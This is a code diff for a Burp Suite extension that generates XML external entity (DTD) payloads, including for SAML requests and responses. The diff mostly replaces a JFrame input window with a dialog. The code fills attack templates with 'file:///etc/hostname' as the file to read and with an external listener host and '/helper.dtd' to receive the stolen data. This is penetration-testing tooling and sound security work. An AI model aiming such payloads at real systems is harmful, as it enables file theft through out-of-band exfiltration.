@@ -29,7 +29,6 @@ import de.rub.nds.burp.utilities.Logging;
 import de.rub.nds.burp.utilities.XMLHelper;
 import java.io.IOException;
 import java.util.ArrayList;
-import java.util.Collections;
 import org.apache.commons.io.IOUtils;
 import org.w3c.dom.Document;
 import org.w3c.dom.Element;
@@ -67,7 +66,7 @@ public class DTDPayloadFactory implements IIntruderPayloadGeneratorFactory {
         private final String samlRequest = "SAMLRequest";
         private final String samlResponse = "SAMLResponse";
         
-        private InputJFrame inputFrame;
+        private InputJDialog dialog;
         private String listener = "listener.org";
         private String protocol = "http";
         
@@ -77,12 +76,10 @@ public class DTDPayloadFactory implements IIntruderPayloadGeneratorFactory {
         private boolean isSamlRequest = false;
         private boolean isSamlResponse = false;
         
-        
         public DTDPayloadGenerator(IIntruderAttack attack) {
             this.attack = attack;
             isSAML();
-            inputFrame = new InputJFrame();
-            // TODO: Wait until button pressed
+            dialog = new InputJDialog();
             readDTDs();
         }
         
@@ -116,8 +113,8 @@ public class DTDPayloadFactory implements IIntruderPayloadGeneratorFactory {
                         for (int j = 0; j < vectors.getLength(); j++) {
                             String vector = vectors.item(j).getTextContent();
                             //Replacing
-                            protocol = inputFrame.getProtocol();
-                            listener = inputFrame.getListener();
+                            protocol = dialog.getProtocol();
+                            listener = dialog.getListener();
                             vector = vector.replace(targetFILE, "file:///etc/hostname");
                             vector = vector.replace(helperURL, protocol+listener+"/helper.dtd");
                             vector = vector.replace(listenURL, protocol+listener);
